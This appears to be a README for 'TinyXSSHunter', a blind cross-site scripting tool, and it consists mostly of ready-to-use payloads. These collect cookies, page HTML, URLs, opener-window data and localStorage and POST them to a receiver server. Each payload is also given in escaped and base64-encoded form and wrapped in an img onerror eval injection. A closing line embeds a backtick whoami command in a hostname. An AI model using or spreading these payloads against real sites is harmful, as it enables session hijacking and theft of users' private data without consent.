# TinyXSSHunter
Note: url in below code needs to be changed. Receiver is just a very simple Java web application. Path value in config.properties needs to point to where you want to store data.
<br><br>
javascript code:
<br>
(function(){if(window.name!=='__'){try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS('http://www.w3.org/1999/xhtml','input');var body=document.getElementsByTagName('body')[0];__.setAttribute('value',escape(dcoo+'\r\n\r\n'+inne+'\r\n\r\n'+durl+'\r\n\r\n'+oloc+'\r\n\r\n'+oloh+'\r\n\r\n'+odoc));fetch('http://localhost:8080/Receiver/r',{method:'POST',body:__.getAttribute('value')})}else{window.name=''}})();
<br><br>
formated javascript code, change \ to \\\\ and ' to \\': 
<br>
(function(){if(window.name!==\\'__\\'){try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS(\\'http://www.w3.org/1999/xhtml\\',\\'input\\');var body=document.getElementsByTagName(\\'body\\')[0];__.setAttribute(\\'value\\',escape(dcoo+\\'\\\\r\\\\n\\\\r\\\\n\\'+inne+\\'\\\\r\\\\n\\\\r\\\\n\\'+durl+\\'\\\\r\\\\n\\\\r\\\\n\\'+oloc+\\'\\\\r\\\\n\\\\r\\\\n\\'+oloh+\\'\\\\r\\\\n\\\\r\\\\n\\'+odoc));fetch(\\'http://localhost:8080/Receiver/r\\',{method:\\'POST\\',body:__.getAttribute(\\'value\\')})}else{window.name=\\'\\'}})();
<br>
<br>
Encoded:
<br>
KGZ1bmN0aW9uKCl7aWYod2luZG93Lm5hbWUhPT0nX18nKXt0cnl7ZGNvbz1kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7ZGNvbz1udWxsfXRyeXtpbm5lPWRvY3VtZW50LmJvZHkucGFyZW50Tm9kZS5pbm5lckhUTUx9Y2F0Y2goZSl7aW5uZT1udWxsfXRyeXtkdXJsPWRvY3VtZW50LlVSTH1jYXRjaChlKXtkdXJsPW51bGx9dHJ5e29sb2M9b3BlbmVyLmxvY2F0aW9ufWNhdGNoKGUpe29sb2M9bnVsbH10cnl7b2xvaD1vcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUx9Y2F0Y2goZSl7b2xvaD1udWxsfXRyeXtvZG9jPW9wZW5lci5kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7b2RvYz1udWxsfXZhciBfXz1kb2N1bWVudC5jcmVhdGVFbGVtZW50TlMoJ2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwnLCdpbnB1dCcpO3ZhciBib2R5PWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF07X18uc2V0QXR0cmlidXRlKCd2YWx1ZScsZXNjYXBlKGRjb28rJ1xyXG5cclxuJytpbm5lKydcclxuXHJcbicrZHVybCsnXHJcblxyXG4nK29sb2MrJ1xyXG5cclxuJytvbG9oKydcclxuXHJcbicrb2RvYykpO2ZldGNoKCdodHRwOi8vbG9jYWxob3N0OjgwODAvUmVjZWl2ZXIvcicse21ldGhvZDonUE9TVCcsYm9keTpfXy5nZXRBdHRyaWJ1dGUoJ3ZhbHVlJyl9KX1lbHNle3dpbmRvdy5uYW1lPScnfX0pKCk7
<br>
<br>
Final payload:
<br>
\<img id=KGZ1bmN0aW9uKCl7aWYod2luZG93Lm5hbWUhPT0nX18nKXt0cnl7ZGNvbz1kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7ZGNvbz1udWxsfXRyeXtpbm5lPWRvY3VtZW50LmJvZHkucGFyZW50Tm9kZS5pbm5lckhUTUx9Y2F0Y2goZSl7aW5uZT1udWxsfXRyeXtkdXJsPWRvY3VtZW50LlVSTH1jYXRjaChlKXtkdXJsPW51bGx9dHJ5e29sb2M9b3BlbmVyLmxvY2F0aW9ufWNhdGNoKGUpe29sb2M9bnVsbH10cnl7b2xvaD1vcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUx9Y2F0Y2goZSl7b2xvaD1udWxsfXRyeXtvZG9jPW9wZW5lci5kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7b2RvYz1udWxsfXZhciBfXz1kb2N1bWVudC5jcmVhdGVFbGVtZW50TlMoJ2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwnLCdpbnB1dCcpO3ZhciBib2R5PWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF07X18uc2V0QXR0cmlidXRlKCd2YWx1ZScsZXNjYXBlKGRjb28rJ1xyXG5cclxuJytpbm5lKydcclxuXHJcbicrZHVybCsnXHJcblxyXG4nK29sb2MrJ1xyXG5cclxuJytvbG9oKydcclxuXHJcbicrb2RvYykpO2ZldGNoKCdodHRwOi8vbG9jYWxob3N0OjgwODAvUmVjZWl2ZXIvcicse21ldGhvZDonUE9TVCcsYm9keTpfXy5nZXRBdHRyaWJ1dGUoJ3ZhbHVlJyl9KX1lbHNle3dpbmRvdy5uYW1lPScnfX0pKCk7 src=x onerror=eval(atob(this.id)\>
<br>
<br>
---------------------------------------plus localstorage----------------------------------------------
<br>
(function(){if(window.name!=='__'){v='';try{var i,l,s=localStorage;for(i=0,l=s.length;i<l;i++){v=v+s.key(i)+'：'+s[s.key(i)]+';';}}catch(e){v=null}try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS('http://www.w3.org/1999/xhtml','input');var body=document.getElementsByTagName('body')[0];__.setAttribute('value',escape(v+'\r\n\r\n'+dcoo+'\r\n\r\n'+inne+'\r\n\r\n'+durl+'\r\n\r\n'+oloc+'\r\n\r\n'+oloh+'\r\n\r\n'+odoc));fetch('http://localhost:8080/Receiver/r',{method:'POST',body:__.getAttribute('value')})}else{window.name=''}})();
<br>
<br>
(function(){if(window.name!==\\'__\\'){v=\\'\\';try{var i,l,s=localStorage;for(i=0,l=s.length;i<l;i++){v=v+s.key(i)+\\':\\'+s[s.key(i)]+\\';\\';}}catch(e){v=null}try{dcoo=document.cookie}catch(e){dcoo=null}try{inne=document.body.parentNode.innerHTML}catch(e){inne=null}try{durl=document.URL}catch(e){durl=null}try{oloc=opener.location}catch(e){oloc=null}try{oloh=opener.document.body.innerHTML}catch(e){oloh=null}try{odoc=opener.document.cookie}catch(e){odoc=null}var __=document.createElementNS(\\'http://www.w3.org/1999/xhtml\\',\\'input\\');var body=document.getElementsByTagName(\\'body\\')[0];__.setAttribute(\\'value\\',escape(v+\\'\\\\r\\\\n\\\\r\\\\n'+dcoo+\\'\\\\r\\\\n\\\\r\\\\n\\'+inne+\\'\\\\r\\\\n\\\\r\\\\n\\'+durl+\\'\\\\r\\\\n\\\\r\\\\n\\'+oloc+\\'\\\\r\\\\n\\\\r\\\\n\\'+oloh+\\'\\\\r\\\\n\\\\r\\\\n\\'+odoc));fetch(\\'http://localhost:8080/Receiver/r\\',{method:\\'POST\\',body:__.getAttribute(\\'value\\')})}else{window.name=\\'\\'}})();
<br>
<br>
KGZ1bmN0aW9uKCl7aWYod2luZG93Lm5hbWUhPT0nX18nKXt2PScnO3RyeXt2YXIgaSxsLHM9bG9jYWxTdG9yYWdlO2ZvcihpPTAsbD1zLmxlbmd0aDtpPGw7aSsrKXt2PXYrcy5rZXkoaSkrJzonK3Nbcy5rZXkoaSldKyc7Jzt9fWNhdGNoKGUpe3Y9bnVsbH10cnl7ZGNvbz1kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7ZGNvbz1udWxsfXRyeXtpbm5lPWRvY3VtZW50LmJvZHkucGFyZW50Tm9kZS5pbm5lckhUTUx9Y2F0Y2goZSl7aW5uZT1udWxsfXRyeXtkdXJsPWRvY3VtZW50LlVSTH1jYXRjaChlKXtkdXJsPW51bGx9dHJ5e29sb2M9b3BlbmVyLmxvY2F0aW9ufWNhdGNoKGUpe29sb2M9bnVsbH10cnl7b2xvaD1vcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUx9Y2F0Y2goZSl7b2xvaD1udWxsfXRyeXtvZG9jPW9wZW5lci5kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7b2RvYz1udWxsfXZhciBfXz1kb2N1bWVudC5jcmVhdGVFbGVtZW50TlMoJ2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwnLCdpbnB1dCcpO3ZhciBib2R5PWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF07X18uc2V0QXR0cmlidXRlKCd2YWx1ZScsZXNjYXBlKHYrJ1xyXG5cclxuJytkY29vKydcclxuXHJcbicraW5uZSsnXHJcblxyXG4nK2R1cmwrJ1xyXG5cclxuJytvbG9jKydcclxuXHJcbicrb2xvaCsnXHJcblxyXG4nK29kb2MpKTtmZXRjaCgnaHR0cDovL2xvY2FsaG9zdDo4MDgwL1JlY2VpdmVyL3InLHttZXRob2Q6J1BPU1QnLGJvZHk6X18uZ2V0QXR0cmlidXRlKCd2YWx1ZScpfSl9ZWxzZXt3aW5kb3cubmFtZT0nJ319KSgpOw==
<br>
<br>
\<img id=KGZ1bmN0aW9uKCl7aWYod2luZG93Lm5hbWUhPT0nX18nKXt2PScnO3RyeXt2YXIgaSxsLHM9bG9jYWxTdG9yYWdlO2ZvcihpPTAsbD1zLmxlbmd0aDtpPGw7aSsrKXt2PXYrcy5rZXkoaSkrJzonK3Nbcy5rZXkoaSldKyc7Jzt9fWNhdGNoKGUpe3Y9bnVsbH10cnl7ZGNvbz1kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7ZGNvbz1udWxsfXRyeXtpbm5lPWRvY3VtZW50LmJvZHkucGFyZW50Tm9kZS5pbm5lckhUTUx9Y2F0Y2goZSl7aW5uZT1udWxsfXRyeXtkdXJsPWRvY3VtZW50LlVSTH1jYXRjaChlKXtkdXJsPW51bGx9dHJ5e29sb2M9b3BlbmVyLmxvY2F0aW9ufWNhdGNoKGUpe29sb2M9bnVsbH10cnl7b2xvaD1vcGVuZXIuZG9jdW1lbnQuYm9keS5pbm5lckhUTUx9Y2F0Y2goZSl7b2xvaD1udWxsfXRyeXtvZG9jPW9wZW5lci5kb2N1bWVudC5jb29raWV9Y2F0Y2goZSl7b2RvYz1udWxsfXZhciBfXz1kb2N1bWVudC5jcmVhdGVFbGVtZW50TlMoJ2h0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwnLCdpbnB1dCcpO3ZhciBib2R5PWRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdib2R5JylbMF07X18uc2V0QXR0cmlidXRlKCd2YWx1ZScsZXNjYXBlKHYrJ1xyXG5cclxuJytkY29vKydcclxuXHJcbicraW5uZSsnXHJcblxyXG4nK2R1cmwrJ1xyXG5cclxuJytvbG9jKydcclxuXHJcbicrb2xvaCsnXHJcblxyXG4nK29kb2MpKTtmZXRjaCgnaHR0cDovL2xvY2FsaG9zdDo4MDgwL1JlY2VpdmVyL3InLHttZXRob2Q6J1BPU1QnLGJvZHk6X18uZ2V0QXR0cmlidXRlKCd2YWx1ZScpfSl9ZWxzZXt3aW5kb3cubmFtZT0nJ319KSgpOw== src=x onerror=eval(atob(this.id))\>
<br>
<br>
Encoder:https://www.w3schools.com/jsref/met_win_atob.asp
<br>
<br>
Thanks to:https://ardern.io/2017/12/10/blind-xss/

https://xss.hackyour.app/ <br>
\`whoami\`.hackyour.app
